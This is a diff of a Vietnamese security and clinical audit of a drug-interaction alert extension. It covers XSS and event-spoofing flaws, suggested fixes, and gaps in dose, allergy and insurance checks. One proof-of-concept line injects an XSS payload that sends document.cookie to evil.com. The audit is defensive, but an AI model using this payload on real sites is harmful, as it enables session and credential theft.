@@ -91,6 +91,7 @@ card.innerHTML = `
 **Vấn đề:** Dữ liệu từ `alert.effect` và `alert.recommendation` được nạp từ JSON rules (`ddi_rules.json`, `drug_disease_rules.json`), nhưng cũng có thể từ bookmarklet import (`importCrawledDrugs`). Nếu kẻ tấn công inject HTML/JS vào tên thuốc khi cào dữ liệu, XSS sẽ thực thi.
 
 **PoC Attack Vector:**
+
 ```javascript
 // Bookmarklet cào thuốc chứa payload
 drugs = [{ ten: '<img src=x onerror="fetch(`https://evil.com?c=`+document.cookie)">', hc: 'paracetamol' }];
@@ -100,6 +101,7 @@ window.dispatchEvent(new CustomEvent('ALADINN_CRAWL_RESULT', { detail: { drugs }
 Tên thuốc chứa payload sẽ được lưu vào IndexedDB → render qua `innerHTML` trong Coverage Pills.
 
 **Đề xuất khắc phục:**
+
 ```javascript
 // Hàm sanitize bắt buộc
 function escapeHtml(str) {
@@ -135,11 +137,13 @@ window.addEventListener('ALADINN_CRAWL_RESULT', async (event) => {
 ```
 
 **Vấn đề:**
+
 1. **Không verify event origin** — Bất kỳ script nào trên vncare.vn (bao gồm 3rd-party ads, tracking scripts) đều có thể dispatch `ALADINN_CRAWL_RESULT`
 2. **Không sanitize** `drug.ten` và `drug.hc` trước khi lưu vào IndexedDB
 3. **Không giới hạn kích thước** — Có thể gửi hàng triệu entries gây DoS IndexedDB
 
 **Đề xuất khắc phục:**
+
 ```javascript
 // 1. Validate event source
 window.addEventListener('ALADINN_CRAWL_RESULT', async (event) => {
@@ -179,6 +183,7 @@ export async function logAuditEvent(record) { ... }
 ```
 
 **Vấn đề:** CDS phát hiện tương tác thuốc nguy hiểm nhưng KHÔNG ghi lại:
+
 - Bác sĩ có nhìn thấy cảnh báo không?
 - Bác sĩ có bỏ qua cảnh báo CRITICAL không?
 - Thời điểm nào, bệnh nhân nào, thuốc nào?
@@ -186,6 +191,7 @@ export async function logAuditEvent(record) { ... }
 Trong y tế, thiếu audit trail = trách nhiệm pháp lý khi xảy ra sự cố thuốc.
 
 **Đề xuất khắc phục:**
+
 ```javascript
 // Ghi log khi: (1) Alert critical được phát, (2) User đóng panel bỏ qua
 await logAuditEvent({
@@ -237,6 +243,7 @@ window.addEventListener('message', async (event) => {
 **Vấn đề:** Bất kỳ `postMessage` nào có `type: 'FORCE_CDS_SYNC'` đều trigger xóa và tải lại toàn bộ Knowledge Base từ JSON bundled. Đây là vector DoS — liên tục gửi message sẽ lock browser.
 
 **Đề xuất:**
+
 ```javascript
 // Rate limit + origin check
 let lastSyncTime = 0;
@@ -263,6 +270,7 @@ window.addEventListener('message', async (event) => {
 **File:** `engine.js` — dòng 318-442
 
 Hiện tại có **15 Drug-Lab rules** được hardcode trực tiếp trong code:
+
 - Warfarin + INR
 - Metformin + eGFR
 - Digoxin + Creatinine
@@ -271,6 +279,7 @@ Hiện tại có **15 Drug-Lab rules** được hardcode trực tiếp trong cod
 - ...
 
 **Vấn đề:**
+
 1. Thêm rule mới = sửa source code + rebuild
 2. Bệnh viện không thể tùy chỉnh ngưỡng (VD: ALT > 120 vs > 100)
 3. Không export/import được
@@ -303,6 +312,7 @@ const DRUG_LAB_RULE_STORE = 'drug_lab_rule';
 #### Mức độ: HIGH (Clinical Gap)
 
 **Hiện trạng:** CDS chỉ check:
+
 - Tương tác thuốc-thuốc (DDI)
 - Chống chỉ định bệnh lý (Drug-Disease)
 - Tương tác thuốc-xét nghiệm (Drug-Lab)
@@ -312,6 +322,7 @@ const DRUG_LAB_RULE_STORE = 'drug_lab_rule';
 **Thiếu:** Kiểm tra liều lượng — 1 trong 5 trụ cột CDS tiêu chuẩn.
 
 **Ví dụ lâm sàng:**
+
 - Paracetamol > 4g/ngày (người lớn) hoặc > 75mg/kg/ngày (trẻ em) → Ngộ độc gan
 - Metformin > 2550mg/ngày → Quá liều
 - Vancomycin ở bệnh nhân suy thận cần hiệu chỉnh liều
@@ -358,6 +369,7 @@ const DRUG_ALLERGY_RULE_STORE = 'drug_allergy_rule';
 ```
 
 **Vấn đề:** Hạ tầng Allergy Check đã xây dựng (DB store, data file) nhưng chưa kích hoạt:
+
 1. Không trích xuất tiền sử dị ứng từ HIS DOM
 2. Không chạy allergy rules trong engine
 3. Cross-allergy (VD: dị ứng Penicillin → cảnh báo Cephalosporin) chưa implement
@@ -396,6 +408,7 @@ function runAllergyRules(allergyRules, normalized, allergies) {
 **File:** `engine.js` — dòng 18-52 (51 alias), `db.js` — dòng 208-236 (35 alias — TRÙNG LẶP)
 
 **Vấn đề:**
+
 1. **Trùng lặp:** 2 bản sao ALIAS_MAP riêng biệt trong `engine.js` và `db.js` → dễ lệch
 2. **Thiếu nhiều alias phổ biến tại Việt Nam:**
 
@@ -416,9 +429,10 @@ function runAllergyRules(allergyRules, normalized, allergies) {
 | Crestor | rosuvastatin | ❌ |
 | Tavanic | levofloxacin | ❌ |
 
-3. **Suffix normalization thiếu:** `engine.js:57-60` — Rule "on→one" quá mạnh, bắt nhầm (VD: "interferon" → "interferone")
+1. **Suffix normalization thiếu:** `engine.js:57-60` — Rule "on→one" quá mạnh, bắt nhầm (VD: "interferon" → "interferone")
 
 **Đề xuất:**
+
 - Gộp ALIAS_MAP vào 1 file duy nhất (`cds-data/alias_map.json`)
 - Bổ sung ~100 biệt dược phổ biến tại VN
 - Thêm bảo vệ suffix: chỉ apply cho từ > 6 ký tự, exclude list (`interferon`, `tamoxifen`, ...)
@@ -432,12 +446,14 @@ function runAllergyRules(allergyRules, normalized, allergies) {
 **File:** `extractor.js`
 
 **Vấn đề:**
+
 1. **`getMedications()`** (dòng 126-241): Duyệt TOÀN BỘ `<tr>` trên trang → bắt nhầm row không phải thuốc
 2. **`getDiagnoses()`** (dòng 72-123): Regex quét text rộng → có thể bắt số phòng (VD: "A301" → ICD A30.1)
 3. **`getLabs()`** (dòng 243-280): Phụ thuộc `window._aladinn_cds_labs` (cached) — nếu Scanner chưa chạy hoặc data cũ → CDS không có xét nghiệm
 4. Không trích xuất **tuổi, giới tính** → không thể check liều nhi khoa, chống chỉ định thai kỳ
 
 **Đề xuất:**
+
 ```javascript
 // 1. Thêm extractAge() và extractGender()
 getAge() {
@@ -475,16 +491,19 @@ getDiagnoses() {
 **File:** `engine.js` — dòng 498-537
 
 Hiện tại chỉ check 2 loại:
+
 1. Thuốc ngoài danh mục BHYT (`is_covered: false`)
 2. Thiếu ICD prefix phù hợp (`icd_prefix_required`)
 
 **Thiếu:**
+
 - Giới hạn số ngày dùng BHYT (VD: kháng sinh tối đa 7 ngày ngoại trú)
 - Giới hạn số lượng thuốc/lần kê (VD: max 5 loại ngoại trú)
 - Trùng hoạt chất cùng ngày (xuất toán BHYT)
 - Quy tắc kê đơn ngoại trú vs nội trú khác nhau
 
 **Đề xuất:** Thêm các rule type:
+
 ```json
 [
     { "rule_code": "INS-MAX-DAYS-AB-001", "condition_type": "max_duration_days", "condition_value": "7", "generic_name": "amoxicillin", "care_setting": "opd" },
@@ -509,6 +528,7 @@ scanTimer = setInterval(runScan, 3000);
 ```
 
 Mỗi lần `runScan()`:
+
 1. `extractContext()` → duyệt **TOÀN BỘ** `<tr>`, `<iframe>`, input fields
 2. `normalizeContext()` → mở IndexedDB, load 3 stores, chạy Levenshtein
 3. `analyzeLocally()` → mở IndexedDB lần 2, load 5 stores, chạy 5 rule engines
@@ -516,6 +536,7 @@ Mỗi lần `runScan()`:
 **Ước tính:** ~50-150ms mỗi scan trên đơn 10 thuốc. Với interval 3s, CPU bận ~5% liên tục.
 
 **Đề xuất:**
+
 ```javascript
 // 1. Cache DB data trong memory (load 1 lần, dùng nhiều lần)
 let cachedGenericMap = null;
@@ -561,6 +582,7 @@ function findClosestGeneric(token, genericMap) {
 400 thuốc × 30 ký tự trung bình = ~360,000 operations mỗi unmapped drug.
 
 **Đề xuất:** Thêm BK-Tree hoặc prefix filtering:
+
 ```javascript
 // Pre-filter: chỉ so sánh thuốc có cùng ký tự đầu ± 1
 function findClosestGeneric(token, genericMap) {
@@ -585,6 +607,7 @@ function findClosestGeneric(token, genericMap) {
 Shield icon hiện tại chỉ đổi viền + animation pulse. Với cảnh báo CRITICAL (nguy cơ tử vong — VD: Warfarin + INR > 3.0), icon cần nổi bật hơn.
 
 **Đề xuất:**
+
 - Critical: Icon đỏ nhấp nháy + badge số lượng alert + sound notification (optional)
 - Tự động bung panel khi phát hiện ≥1 CRITICAL alert (override hasUserDismissed 1 lần)
 
@@ -593,10 +616,12 @@ Shield icon hiện tại chỉ đổi viền + animation pulse. Với cảnh bá
 ### CDS-UX-02: Không Có "Acknowledge" Button
 
 Khi bác sĩ nhìn thấy cảnh báo, không có cách ghi nhận "Tôi đã đọc và quyết định tiếp tục". Điều này:
+
 1. Không tạo audit trail
 2. Không phân biệt "chưa thấy" vs "thấy rồi, bỏ qua"
 
 **Đề xuất:** Thêm nút "Đã xem" hoặc "Bỏ qua — Có lý do lâm sàng":
+
 ```html
 <button class="cds-ack-btn" onclick="acknowledgeAlert('DDI-WARFARIN-ASP-001')">
     ✓ Đã xem, tiếp tục kê đơn
@@ -610,6 +635,7 @@ Khi bác sĩ nhìn thấy cảnh báo, không có cách ghi nhận "Tôi đã đ
 Alert cards thiếu trích nguồn (reference). Bác sĩ cần biết khuyến cáo đến từ đâu (UpToDate, BNF, MIMS, Dược thư Việt Nam).
 
 **Đề xuất:** Thêm field `source` trong mỗi rule:
+
 ```javascript
 { source: 'Dược thư Quốc gia Việt Nam 2024, tr.215' }
 
